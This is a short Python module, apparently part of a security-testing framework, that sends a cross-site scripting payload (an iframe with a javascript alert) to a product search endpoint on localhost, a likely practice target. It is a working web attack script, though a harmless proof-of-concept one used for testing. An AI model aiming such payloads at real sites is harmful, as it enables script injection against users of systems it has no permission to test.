from . import attack as a
from .header_config import *

class xss_search(a.attack_inter):
    def __init__(self):
        pass

    def generator(self, myScript='<iframe src="javascript:alert(`xss`)">'):
        cookies = COOKIE

        headers = HEADER

        params = {
            'q': myScript,
        }

        return cookies, headers, params

    def run(self):

        cookies, headers, myparams = self.generator()
        print(myparams)
        response = a.requests.get('http://localhost:3000/rest/products/search', params=myparams, cookies=cookies, headers=headers, verify=False)